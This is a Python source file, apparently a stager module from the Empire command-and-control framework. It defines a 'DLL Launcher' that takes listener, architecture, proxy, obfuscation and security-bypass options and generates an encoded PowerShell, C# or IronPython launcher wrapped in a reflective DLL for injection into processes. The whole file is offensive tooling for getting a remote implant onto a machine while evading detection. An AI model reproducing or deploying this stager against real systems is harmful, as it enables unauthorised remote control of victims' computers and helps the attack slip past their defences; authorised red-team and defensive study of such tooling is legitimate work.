import logging

from empire.server.core.db.base import SessionLocal

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "DLL Launcher",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@sixdub",
                    "Link": "",
                }
            ],
            "Description": "Generate a PowerPick Reflective DLL to inject with stager code.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "Arch": {
                "Description": "Architecture of the .dll to generate (x64 or x86).",
                "Required": True,
                "Value": "x64",
                "SuggestedValues": ["x64", "x86"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "File to output dll to.",
                "Required": True,
                "Value": "launcher.dll",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        listener_name = self.options["Listener"]["Value"]
        arch = self.options["Arch"]["Value"]

        # staging options
        language = self.options["Language"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        bypasses = self.options["Bypasses"]["Value"]

        if not self.mainMenu.listenersv2.get_active_listener_by_name(
            listener_name
        ) and not self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name):
            # not a valid listener, return nothing for the script
            log.error(f"[!] Invalid listener: {listener_name}")
            return ""

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        if obfuscate_script and "launcher" in obfuscate_command.lower():
            log.error(
                "If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager."
            )
            return ""

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=True,
                listener_name=listener_name,
            )

        elif language == "powershell":
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language=language,
                encode=True,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                bypasses=bypasses,
            )

        if launcher == "":
            log.error("[!] Error in launcher generation.")
            return ""

        launcher_code = launcher.split(" ")[-1]
        return self.mainMenu.stagergenv2.generate_dll(launcher_code, arch)
